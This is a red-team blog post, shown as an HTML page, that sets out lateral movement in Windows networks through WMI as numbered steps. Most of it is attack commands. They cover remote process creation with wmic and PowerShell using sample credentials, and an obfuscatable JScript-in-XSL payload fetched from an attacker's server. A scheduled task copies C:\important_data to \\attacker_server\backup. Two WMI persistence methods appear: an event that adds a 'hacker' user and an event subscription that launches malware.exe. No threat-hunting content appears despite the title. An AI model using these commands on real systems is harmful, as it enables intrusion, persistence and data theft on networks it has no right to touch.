<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D}</style><title>Lateral Movement via WMI and Threat Hunting Techniques Part 2.1</title>
<meta name=description content="Windows Management Instrumentation (WMI) is a powerful management tool in Windows that allows remote execution of commands and data collection without the need …"><meta name=keywords content='blog,gokarna,hugo,Red Team,Lateral Movement'><meta property="og:url" content="https://binophism.github.io/posts/wmi-for-lateral-movement-part2.1/"><meta property="og:type" content="website"><meta property="og:title" content="Lateral Movement via WMI and Threat Hunting Techniques Part 2.1"><meta property="og:description" content="Windows Management Instrumentation (WMI) is a powerful management tool in Windows that allows remote execution of commands and data collection without the need …"><meta property="og:image" content="https://avatars.githubusercontent.com/u/63192240?v=4"><meta property="og:image:secure_url" content="https://avatars.githubusercontent.com/u/63192240?v=4"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="Lateral Movement via WMI and Threat Hunting Techniques Part 2.1"><meta name=twitter:description content="Windows Management Instrumentation (WMI) is a powerful management tool in Windows that allows remote execution of commands and data collection without the need …"><meta property="twitter:domain" content="https://binophism.github.io/posts/wmi-for-lateral-movement-part2.1/"><meta property="twitter:url" content="https://binophism.github.io/posts/wmi-for-lateral-movement-part2.1/"><meta name=twitter:image content="https://avatars.githubusercontent.com/u/63192240?v=4"><link rel=canonical href=https://binophism.github.io/posts/wmi-for-lateral-movement-part2.1/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.893af8dd3b65bd0ffe90e7af33847bd6dc9180b8fa6d6659a212a6f4b62d3e01.js integrity="sha256-iTr43TtlvQ/+kOevM4R71tyRgLj6bWZZohKm9LYtPgE="></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css integrity=sha384-Xi8rHCmBmhbuyyhbI88391ZKP2dmfnOl4rT9ZfRI7mLTdk1wblIUnrIq35nqwEvC crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.js integrity=sha384-X/XCfMm41VSsqRNQgDerQczD69XqmjOOOwYQvr/uuC+j4OPoNhVgjdGFwhvN02Ja crossorigin=anonymous></script><script defer src=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/auto-render.min.js integrity=sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR crossorigin=anonymous></script><script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}],throwOnError:!1})})</script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://binophism.github.io/><img src='https://avatars.githubusercontent.com/u/63192240?v=4' alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://binophism.github.io/>Mohammad Mahdi Anbaraki</a></div><div class=nav-links><div class=nav-link><a href=https://binophism.github.io/><span data-feather=home></span> Home</a></div><div class=nav-link><a href=https://binophism.github.io/posts/><span data-feather=book></span> Posts</a></div><div class=nav-link><a href=https://binophism.github.io/projects/><span data-feather=code></span> Projects</a></div><div class=nav-link><a href=https://binophism.github.io/tags/><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://github.com/binophism><span data-feather=github></span></a></div><div class=nav-link><a href=https://binophism.github.io/index.xml><span data-feather=rss></span></a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target"></span>
<a><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://binophism.github.io/><span data-feather=home></span> Home</a></li><li class=nav-item><a href=https://binophism.github.io/posts/><span data-feather=book></span> Posts</a></li><li class=nav-item><a href=https://binophism.github.io/projects/><span data-feather=code></span> Projects</a></li><li class=nav-item><a href=https://binophism.github.io/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://github.com/binophism><span data-feather=github></span></a></li><li class=nav-item><a href=https://binophism.github.io/index.xml><span data-feather=rss></span></a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>Lateral Movement via WMI and Threat Hunting Techniques Part 2.1</h1><small role=doc-subtitle>Windows Management Instrumentation (WMI) is a powerful management tool in Windows that allows remote execution of commands and data collection without the need for additional software installation. This tool is often exploited in cyberattacks for lateral movement within networks. By leveraging WMI, attackers can gain control over systems remotely, execute commands, and gather critical information.</small><p class=post-date>October 25, 2024</p><ul class=post-tags><li class=post-tag><a href=https://binophism.github.io/tags/red-team>Red Team</a></li><li class=post-tag><a href=https://binophism.github.io/tags/lateral-movement>Lateral Movement</a></li></ul></div><div class=post-content><h3 id=steps-for-lateral-movement-in-a-microsoft-network-using-wmi>Steps for Lateral Movement in a Microsoft Network Using WMI</h3><p>To perform lateral movement within a Microsoft network leveraging WMI, follow these steps. The stages will be explained with practical examples using various approaches. It’s important to note that this is not an exhaustive list of methods for lateral movement with WMI, and this section will be updated regularly.</p><hr><h3 id=step-1-reconnaissance>Step 1: Reconnaissance</h3><p><img src=/images/recon.png alt>
Reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. Such information may include details of the victim organization, infrastructure, or staff/personnel. This information can be leveraged by the adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute Initial Access, to scope and prioritize post-compromise objectives, or to drive and lead further Reconnaissance efforts. For example, techniques such as port scanning, OSINT (Open Source Intelligence), and others can be mentioned.</p><hr><h3 id=step-2-initial-access>Step 2: Initial Access</h3><p><img src=/images/initial%20access.png alt>
The most critical phase of an attack is the initial access, which can be achieved through social engineering, such as sending an Office document with a macro, or, in more advanced cases, an Office or PDF file that exploits a vulnerability in a specific software.</p><p>It is noteworthy that many threat actors today specialize solely in obtaining initial access to organizations and then selling that access; these individuals are known as <strong>access brokers</strong>. For instance, these brokers may gain initial access to 100 organizations and then sell it in bulk to ransomware operators.</p><hr><h3 id=step-3-remote-command-execution-using-wmi>Step 3: Remote Command Execution Using WMI</h3><p><img src=/images/execution.png alt>
Various tools can be used, such as <code>wmic</code> in Windows or PowerShell. Here is an example with <code>wmic</code> in Windows Command Prompt:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>wmic /node:&lt;target_ip&gt; /user:&lt;username&gt; /password:&lt;password&gt; process call create <span style=color:#e6db74>&#34;cmd.exe /c &lt;command&gt;&#34;</span>
</span></span></code></pre></div><p>Example:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>wmic /node:192.168.1.10 /user:admin /password:password123 process call create <span style=color:#e6db74>&#34;cmd.exe /c ipconfig&#34;</span>
</span></span></code></pre></div><p>Using PowerShell for WMI queries:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$credential = New-Object System.Management.Automation.PSCredential (<span style=color:#e6db74>&#34;username&#34;</span>, (ConvertTo-SecureString <span style=color:#e6db74>&#34;password&#34;</span> -AsPlainText -Force))
</span></span><span style=display:flex><span>Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName <span style=color:#e6db74>&#34;target_ip&#34;</span> -Credential $credential -ArgumentList <span style=color:#e6db74>&#34;cmd.exe /c &lt;command&gt;&#34;</span>
</span></span></code></pre></div><p>Example:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$credential = New-Object System.Management.Automation.PSCredential (<span style=color:#e6db74>&#34;admin&#34;</span>, (ConvertTo-SecureString <span style=color:#e6db74>&#34;password123&#34;</span> -AsPlainText -Force))
</span></span><span style=display:flex><span>Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName <span style=color:#e6db74>&#34;192.168.1.10&#34;</span> -Credential $credential -ArgumentList <span style=color:#e6db74>&#34;cmd.exe /c ipconfig&#34;</span>
</span></span></code></pre></div><p>Alternatively, you can use the <code>impacket-wmiexec</code> tool. One of its distinguishing features is support for Pass the Hash (PTH). Using an NTLM hash, you can execute commands and also specify the type of shell (in this case, PowerShell):
<img src=/images/impacket-wmiexec.png alt="Figure: Remote Command Execution Using impacket-wmiexec"></p><hr><h3 id=remote-execution-with-jscript-and-vbscript>Remote Execution with JScript and VBScript</h3><p>Given that scripting languages like VBScript and JScript allow interaction with WMI, this example demonstrates executing an XSL file remotely without placing it on the victim’s system. By obfuscating the file, security mechanisms can be bypassed, and JScript code will run in memory. Here’s an example of a simple JScript that executes the <code>net user</code> command via <code>cmd</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#39;1.0&#39;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;stylesheet</span>
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>xmlns=</span><span style=color:#e6db74>&#34;http://www.w3.org/1999/XSL/Transform&#34;</span> <span style=color:#a6e22e>xmlns:ms=</span><span style=color:#e6db74>&#34;urn:schemas-microsoft-com:xslt&#34;</span>
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>xmlns:user=</span><span style=color:#e6db74>&#34;placeholder&#34;</span>
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>version=</span><span style=color:#e6db74>&#34;1.0&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;output</span> <span style=color:#a6e22e>method=</span><span style=color:#e6db74>&#34;text&#34;</span><span style=color:#f92672>/&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;ms:script</span> <span style=color:#a6e22e>implements-prefix=</span><span style=color:#e6db74>&#34;user&#34;</span> <span style=color:#a6e22e>language=</span><span style=color:#e6db74>&#34;JScript&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>&lt;![CDATA[
</span></span></span><span style=display:flex><span><span style=color:#75715e>    var r = new ActiveXObject(&#34;WScript.Shell&#34;).Run(&#34;cmd.exe /c net user&#34;);
</span></span></span><span style=display:flex><span><span style=color:#75715e>  ]]&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;/ms:script&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/stylesheet&gt;</span>
</span></span></code></pre></div><p>Then, use the following command to load the malicious XSL file from the attacker&rsquo;s server and execute it on the host system:
<img src=/images/remote%20xls.PNG alt="Figure: Loading a Malicious XSL File from the Attacker’s Server"></p><h3 id=step-4-creating-scheduled-tasks>Step 4: Creating Scheduled Tasks</h3><p><img src=/images/sc.png alt>
An attacker can use WMI to create a scheduled task, allowing them to execute commands on a continuous basis. The following PowerShell commands illustrate how to set up such a task:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$task = <span style=color:#e6db74>@&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>schtasks /create /tn &#34;BackupScript&#34; /tr &#34;cmd.exe /c copy C:\important_data\* \\attacker_server\backup&#34; /sc once /st 00:00
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#34;@</span>
</span></span><span style=display:flex><span>Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName <span style=color:#e6db74>&#34;192.168.1.10&#34;</span> -Credential $credential -ArgumentList $task
</span></span></code></pre></div><hr><h3 id=step-5-persistence>Step 5: Persistence</h3><p><img src=/images/persis.png alt>
An attacker can also set up persistent WMI events, enabling commands to run at specific times or in response to particular events. To implement this in PowerShell, use the following commands:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$Query = <span style=color:#e6db74>&#34;SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA &#39;Win32_Process&#39;&#34;</span>
</span></span><span style=display:flex><span>$Filter = New-Object Management.ManagementEventWatcher($Query)
</span></span><span style=display:flex><span>$Action = { &amp; <span style=color:#e6db74>&#34;cmd.exe /c net user hacker hacker /add&#34;</span> }
</span></span><span style=display:flex><span>Register-WmiEvent -Query $Query -SourceIdentifier <span style=color:#e6db74>&#34;WMIEvent&#34;</span> -Action $Action
</span></span></code></pre></div><p>Another persistence technique attackers employ is WMI event subscription.</p><p><img src=/images/WMI%20event%20subscription.png alt="Figure 5: WMI Event Subscription"></p><p>This technique triggers malware execution in response to specific system events. WMI provides capabilities to accomplish this. Generally, implementing this technique involves several steps:</p><ol><li><strong>Event Filters</strong>: The filter specifies which events will trigger the desired program. These events can include time, a specific process creation, user login, uptime duration, etc. To filter events, use <code>__EventFilter</code>.</li><li><strong>Event Consumers</strong>: The defined program (malware) will run when the specified event occurs. To achieve this, use <code>__EventConsumer</code>.</li><li><strong>Event Bindings</strong>: This step links the event filter to the event consumer, ensuring malware execution upon the event trigger. To bind them, use <code>__FilterToConsumerBinding</code>.</li></ol><p>Here are the commands to utilize this technique:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>wmic /NAMESPACE:<span style=color:#e6db74>&#34;\root\subscription&#34;</span> PATH __EventFilter CREATE Name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Update&#34;</span>, EventNameSpace<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;root\cimv2&#34;</span>,QueryLanguage<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;WQL&#34;</span>, Query<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Select * From __InstanceCreationEvent Within 15 Where (TargetInstance Isa &#39;Win32_Process&#39; And TargetInstance.Name = &#39;firefox.exe&#39;)&#34;</span>
</span></span></code></pre></div><p>This command creates an event filter named “Update” in the <code>root\cimv2</code> namespace that monitors for a new process named <code>firefox.exe</code> within the last 15 seconds.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>wmic /NAMESPACE:<span style=color:#e6db74>&#34;\root\subscription&#34;</span> PATH CommandLineEventConsumer CREATE Name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;INConsumer&#34;</span>, WorkingDirectory<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;C:\ProgramData&#34;</span>, CommandLineTemplate<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;C:\ProgramData\malware.exe&#34;</span>
</span></span></code></pre></div><p>This command creates a new event consumer named “INConsumer,” which will run the malware located at the specified path when the defined event occurs.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>wmic /NAMESPACE:<span style=color:#e6db74>&#34;\root\subscription&#34;</span> PATH __FilterToConsumerBinding CREATE Filter<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;__EventFilter.Name=\&#34;Update\&#34;&#34;</span>, Consumer<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;CommandLineEventConsumer.Name=\&#34;INConsumer\&#34;&#34;</span>
</span></span></code></pre></div><p>This command links the event filter to the event consumer. Once this binding is established, the <code>Update</code> filter will monitor for processes named <code>firefox.exe</code> created within the last 15 seconds. When this event is detected, the consumer activates and executes the malware.</p></div><div class=prev-next></div><svg id="btt-button" class="arrow-logo" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><ul><li><a href=#steps-for-lateral-movement-in-a-microsoft-network-using-wmi>Steps for Lateral Movement in a Microsoft Network Using WMI</a></li><li><a href=#step-1-reconnaissance>Step 1: Reconnaissance</a></li><li><a href=#step-2-initial-access>Step 2: Initial Access</a></li><li><a href=#step-3-remote-command-execution-using-wmi>Step 3: Remote Command Execution Using WMI</a></li><li><a href=#remote-execution-with-jscript-and-vbscript>Remote Execution with JScript and VBScript</a></li><li><a href=#step-4-creating-scheduled-tasks>Step 4: Creating Scheduled Tasks</a></li><li><a href=#step-5-persistence>Step 5: Persistence</a></li></ul></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 binophism</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/526avijitgupta/gokarna>Gokarna</a></span></footer></body></html>